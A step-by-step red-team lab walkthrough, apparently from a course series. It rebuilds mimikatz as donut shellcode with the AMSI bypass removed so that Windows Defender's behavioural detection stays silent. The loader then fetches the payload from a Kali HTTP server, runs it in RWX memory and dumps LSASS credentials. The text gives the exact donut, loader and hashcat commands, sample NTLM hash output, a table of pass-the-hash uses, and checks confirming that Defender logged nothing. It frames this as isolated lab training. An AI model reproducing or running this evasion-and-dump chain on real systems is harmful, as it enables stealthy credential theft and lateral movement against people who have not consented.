# Lab: LSASS Credential Dump via Donut Shellcode Without Behavioral Detection

## Overview

In this lab you will rebuild the donut shellcode from Lab 4 with a single flag change - switching from `-b 2` to `-b 1` - to strip the AMSI bypass code out of the shellcode bootstrap entirely. This eliminates the `Behavior:Win32/AMSI_Patch_T.B12` detection that terminated execution in Lab 4. You will then execute the new shellcode through the same `loader.exe` with LSASS-dump arguments, observe mimikatz completing the full `privilege::debug` / `sekurlsa::logonpasswords` sequence, and confirm that no Defender alert fires at any stage.

---

## Prerequisites

| Requirement | Details |
|---|---|
| OS (Target) | Windows 11 VM - Local Administrator |
| OS (Attacker) | Kali Linux on the same subnet |
| Permissions | Local Administrator on the Windows target |
| Tools (Kali) | `donut` at `/Lab-Artifacts/donut/donut`, `mimikatz.exe`, Python 3 |
| Tools (Windows) | `loader.exe` at `C:\Windows\Tasks\` (from Lab 3), PowerShell 5.1+ |
| Source (Kali) | `/Lab-Artifacts/Mimikatz/mimikatz.exe` |
| Network | Both VMs on the same host-only or internal network adapter |
| Labs 3 & 4 | Complete - `loader.exe` must already be in `C:\Windows\Tasks\` |

> ⚠️ **Warning:** This lab reads credentials from LSASS process memory on a live Windows system. Perform this lab inside isolated virtual machines only - never on a production system, domain-joined host, or any machine you do not own and have explicit authorization to test.

---

## Lab Goals

- Understand the difference between SAM-based credential dumping and LSASS memory credential dumping
- Generate shellcode with donut using `-b 1` (no bypass) and LSASS-dump arguments
- Execute the shellcode through `loader.exe` and observe a complete `sekurlsa::logonpasswords` dump in the console
- Interpret the mimikatz LSASS dump output and identify NTLM hash and plaintext credential fields
- Confirm `Get-MpThreatDetection` and the Defender event log show no new entries

---

## Background: SAM Dump vs LSASS Dump

### What Changes Between the Two Approaches

The SAM dump in Lab 4/5 (`lsadump::sam`) reads from the **registry hives on disk**: it accesses the `HKLM\SAM` and `HKLM\SYSTEM` keys to extract the SYSKEY and decrypt locally stored NTLM hashes. These hashes represent account passwords as stored - they are not tied to any active session.

LSASS dumping (`sekurlsa::logonpasswords`) is fundamentally different. It reads **directly from the LSASS process memory**. The Local Security Authority Subsystem Service (LSASS) maintains credential material for every currently authenticated session, including:

- NTLM hashes for every logged-in account
- Kerberos tickets and session keys
- Plaintext passwords cached by the WDigest authentication provider (enabled by default on Windows Server 2008 R2 / Windows 7 and earlier; disabled by default on Windows 8.1+ and Server 2012 R2+, but re-enabling it is a one-line registry change)

The table below summarises the two approaches:

| Property | `lsadump::sam` | `sekurlsa::logonpasswords` |
|---|---|---|
| Data source | Registry hives (`SAM`, `SYSTEM`) | LSASS process memory |
| Credential type | Locally stored NTLM hashes (all local accounts) | Active session credentials (all currently logged-in users) |
| Plaintext passwords | Never | Yes, if WDigest is enabled |
| Domain accounts visible | No (local accounts only) | Yes (any domain user with an active session) |
| Required privilege | `token::elevate` to SYSTEM | `SeDebugPrivilege` (enabled with `privilege::debug`) |

For an attacker on a machine where a domain admin has an active session, `sekurlsa::logonpasswords` is significantly higher value than a SAM dump - it exposes domain credentials, not just local ones.

### Why `-b 1` Still Defeats the Detection

The same logic from Lab 4 applies here. Donut's `-b 2` flag bakes AMSI patching code into the shellcode bootstrap, which writes a `ret` stub over `AmsiScanBuffer` in the loaded `amsi.dll`. Windows Defender's kernel-mode callback detects that write - the detection fires before the payload ever runs.

Switching to `-b 1` removes the patching block entirely. No write to `amsi.dll` occurs and no kernel-mode callback fires. AMSI is not in the execution path for native Win32 PEs like `mimikatz.exe`, so the bypass was never needed.

**Detection delta:**

| Stage | Lab 4 (`-b 2`) | This Lab (`-b 1`) |
|---|---|---|
| Shellcode bootstrap | Writes `ret` stub into `amsi.dll` `.text` | No write to `amsi.dll` |
| Behavioral detection | `Behavior:Win32/AMSI_Patch_T.B12` fires | No detection fires |
| Payload execution | Terminated by Defender | Completes normally |
| LSASS dump | Blocked | Succeeds |

---

## Part 1: Build the Shellcode on Kali

### Step 1 - Confirm the Mimikatz Source Binary Exists

```bash
ls -lh /Lab-Artifacts/Mimikatz/mimikatz.exe
file /Lab-Artifacts/Mimikatz/mimikatz.exe
```

**Expected output:**
```
/Lab-Artifacts/Mimikatz/mimikatz.exe: PE32+ executable for MS Windows 5.02 (console), x86-64, 6 sections
```

### Step 2 - Generate the Shellcode

```bash
cd /Lab-Artifacts/Mimikatz/
```

```bash
donut \
    -i /Lab-Artifacts/Mimikatz/mimikatz.exe \
    -a 2 \
    -b 1 \
    -p '"privilege::debug" "sekurlsa::logonpasswords" "exit"' \
    -o mimi-lsass.bin
```

**Flags:**

| Flag | Value | Purpose |
|---|---|---|
| `-i` | `mimikatz.exe` | Source PE to wrap in shellcode |
| `-a` | `2` | Target architecture - `1`=x86, `2`=x64, `3`=x86+x64 |
| `-b` | `1` | AMSI bypass method - `1`=**none**, `2`=Abort on fail, `3`=Continue on fail (default) |
| `-p` | `'"privilege::debug" "sekurlsa::logonpasswords" "exit"'` | Command-line arguments forwarded to mimikatz at runtime, executed in sequence |
| `-o` | `mimi-lsass.bin` | Output shellcode file |

**Expected output:**
```
  [ Instance type : Embedded
  [ Module file   : "/Lab-Artifacts/Mimikatz/mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    : "privilege::debug" "sekurlsa::logonpasswords" "exit"
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : none
  [ PE Headers    : overwrite
  [ Shellcode     : "mimi-lsass.bin"
  [ Exit          : Thread
```

The key line is `AMSI/WDLP/ETW : none`. The shellcode bootstrap contains no AMSI patching code - the trigger for `Behavior:Win32/AMSI_Patch_T.B12` is gone.

### Step 3 - Verify the Output File

```bash
ls -lh /Lab-Artifacts/Mimikatz/mimi-lsass.bin
file /Lab-Artifacts/Mimikatz/mimi-lsass.bin
```

**Expected output:**
```
-rw-r--r-- 1 kali kali <size> mimi-lsass.bin
/Lab-Artifacts/Mimikatz/mimi-lsass.bin: data
```

`data` confirms there is no PE header - this is raw position-independent shellcode, not an executable.

---

## Part 2: Stage the Shellcode on Kali

### Step 1 - Start the HTTP Server

Open a new Kali terminal and serve the shellcode from the donut output directory:

```bash
cd /Lab-Artifacts/Mimikatz/
python3 -m http.server 8080
```

**Expected output:**
```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Leave this terminal open. It will log the download request from the Windows VM.

### Step 2 - Note Your Kali IP Address

Open a second Kali terminal:

```bash
ip -4 addr show eth0 | grep inet
```

> 📝 **Note:** Replace `eth0` with your actual interface name if different (e.g. `eth1`, `ens33`). Record the IP - you will use it in the loader command on the Windows side.

---

## Part 3: Execute the Shellcode on the Windows VM

### Step 1 - Open an Elevated PowerShell Session

1. On the Windows VM, right-click the Start menu.
2. Select **Windows PowerShell (Admin)** or **Terminal (Admin)**.

Administrator privileges are required for `privilege::debug` to successfully enable `SeDebugPrivilege` and for `sekurlsa::logonpasswords` to open a handle to the LSASS process.

### Step 2 - Execute the Loader with the Shellcode URL

Replace `<KALI-IP>` with the IP recorded in Part 2 Step 2:

```powershell
C:\Windows\Tasks\loader.exe http://<KALI-IP>:8080/mimi-lsass.bin
```

The loader will:
1. Fetch `mimi-lsass.bin` over HTTP into a heap buffer
2. Allocate an RWX memory region with `VirtualAlloc(PAGE_EXECUTE_READWRITE)` and copy the shellcode into it
3. Spawn a thread at the shellcode entry point with `CreateThread` and wait for it to finish with `WaitForSingleObject`

**Expected behaviour on Kali HTTP server:**
```
192.168.x.x - - [date] "GET /mimi-lsass.bin HTTP/1.1" 200 -
```

### Step 3 - Observe the LSASS Dump Output

Mimikatz output will appear in the `loader.exe` console window as the shellcode executes. A successful run produces output similar to:

```
  .#####.   mimikatz 2.2.0 (x64) ...
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ...
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ...
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***\

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : labuser
Domain            : EVASION_WIN11
Logon Server      : EVASION_WIN11
Logon Time        : 11/11/2026 10:00:00 AM
SID               : S-1-5-21-...

        msv :
         [00000003] Primary
         * Username : labuser
         * Domain   : EVASION_WIN11
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : d0d4d93f98ad3fc8ca58938eee61a3fc...
        tspkg :
        wdigest :
         * Username : labuser
         * Domain   : EVASION_WIN11
         * Password : (null)
        kerberos :
         * Username : labuser
         * Domain   : EVASION_WIN11
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
...

mimikatz(commandline) # exit
Bye!
```

> 📝 **Note:** `Password : (null)` in the `wdigest` block is expected on Windows 8.1+ and Server 2012 R2+ with the default WDigest configuration. If the lab VM is a legacy OS or WDigest has been re-enabled in the registry, cleartext passwords appear here instead.

The `loader.exe` process then returns from `WaitForSingleObject` and exits normally.

> ⚠️ **Note:** No Defender toast notification or quarantine dialog should appear during or after execution. If Defender terminates the process before mimikatz output appears, refer to the Common Errors section.

---

## Part 4: Interpret the LSASS Dump Output

### Understanding the Fields

| Field | Description |
|---|---|
| `Authentication Id` | The LUID (Locally Unique Identifier) for this logon session. Each interactive, service, and network logon gets its own LUID |
| `Session` | Logon session type: `Interactive` = local login, `Service` = service account, `Network` = remote auth (e.g. SMB), `RemoteInteractive` = RDP |
| `User Name` / `Domain` | The account and its authority. `NT AUTHORITY` for built-in service accounts |
| `Logon Time` | When this session was established |
| `SID` | The Security Identifier for the account |
| `msv` | The MSV1_0 authentication package - stores the primary credential (NTLM hash and SHA1) |
| `wdigest` | The WDigest provider - stores credentials in a reversible form; `(null)` means WDigest caching is disabled |
| `kerberos` | The Kerberos provider - stores Kerberos credentials and TGTs |
| `tspkg` | Terminal Services credentials |
| `credman` | Windows Credential Manager entries |

### Key Fields for Lateral Movement

The fields most useful for further attack are:

| Provider | Field | Use |
|---|---|---|
| `msv` | `NTLM` | Pass-the-Hash to SMB, WMI, PSExec |
| `wdigest` | `Password` | Plaintext credential - usable anywhere the password is accepted (if not null) |
| `kerberos` | `Password` | Cleartext kerberos credential for ticket requests |

### Cracking the NTLM Hash

The 32-character NTLM hash from the `msv` block can be submitted to offline cracking:

```bash
hashcat -m 1000 -a 0 8846f7eaee8fb117ad06bdd830b7586c /usr/share/wordlists/rockyou.txt
```

> ⚠️ **Note:** Do not extract, copy, or use credentials outside your isolated lab environment.

### Comparing LSASS Output with SAM Output

| Property | `lsadump::sam` | `sekurlsa::logonpasswords` |
|---|---|---|
| Accounts visible | All local accounts, regardless of session | Only accounts with an active logon session |
| Guest / disabled accounts | Yes | Only if they have an active session |
| Domain accounts | No | Yes, if logged in locally or via RDP |
| Plaintext passwords | Never | Yes, if WDigest caching is enabled |
| Format | RID + `Hash NTLM: LM:NTLM` | Per-provider credential blocks per session |

### Step 1 - Record the Output

In your lab notes, record:
- The `Authentication Id` and `User Name` for each session block
- The `NTLM` hash from the `msv` provider for each account
- Whether any `wdigest` or `kerberos` blocks contain a non-null `Password` value

---

## Part 5: Verify No Defender Detection Fired

### Step 1 - Check Active Threat Detections

```powershell
Get-MpThreatDetection | Select-Object -Last 5 | Format-List
```

**Expected result:** No entries with an `InitialDetectionTime` matching your execution. If this list is empty, no detections have occurred at all this session.

### Step 2 - Check the Defender Event Log

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.Id -in @(1116, 1117) } |
  Select-Object TimeCreated, Id, Message |
  Select-Object -First 5 |
  Format-List
```

**Expected result:** No events with a `TimeCreated` timestamp matching your execution.

| Event ID | Meaning if present |
|---|---|
| **1116** | Malware detected - Defender identified a threat |
| **1117** | Malware action taken - Defender quarantined or removed something |

Neither event should appear for this run.

### Step 3 - Lab Outcome Summary

| Check | Lab 4 (`-b 2`) | This Lab (`-b 1`) |
|---|---|---|
| `AMSI/WDLP/ETW` line in donut output | `abort` | `none` |
| Mimikatz output visible | No - process killed by Defender | Yes - full LSASS dump printed |
| `Get-MpThreatDetection` | `Behavior:Win32/AMSI_Patch_T.B12` present | No new entries |
| Defender Event Log 1116/1117 | Present with matching timestamp | No entries matching execution |
| Credentials obtained | No | Yes - NTLM hashes and session metadata |

---

## Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `AMSI bypass : Patch AmsiScanBuffer` in donut output | Wrong `-b` flag - `-b 2` was used instead of `-b 1` | Re-run the donut command with `-b 1` and regenerate `mimi-lsass.bin` |
| Loader hangs after downloading shellcode | Shellcode is executing but mimikatz is blocked | Wait 30 seconds; if no output appears, check `Get-MpThreatDetection` for a new threat entry |
| Defender kills the process before mimikatz output | A separate behavioral rule fired | Note the exact `ThreatName` from `Get-MpThreatDetection`; this indicates a detection surface beyond AMSI patching |
| `ERROR kuhl_m_privilege_debug` | PowerShell session is not elevated | Re-open PowerShell as Administrator before running the loader |
| `sekurlsa::logonpasswords` returns no session blocks | `privilege::debug` did not succeed - `SeDebugPrivilege` not enabled | Confirm `Privilege '20' OK` appears in the output before the session blocks |
| All `wdigest` / `kerberos` `Password` fields are `(null)` | WDigest caching is disabled (default on Windows 8.1+) | Expected behaviour - NTLM hashes in the `msv` block are still present and usable |
| HTTP server returns 404 | `mimi-lsass.bin` is not in the directory being served | Confirm `python3 -m http.server 8080` is running from `/Lab-Artifacts/Mimikatz/` where `mimi-lsass.bin` was written |
| Request times out on the Windows side | Kali HTTP server not running or wrong IP | Confirm Python server is active; verify IP with `ip a` on Kali |
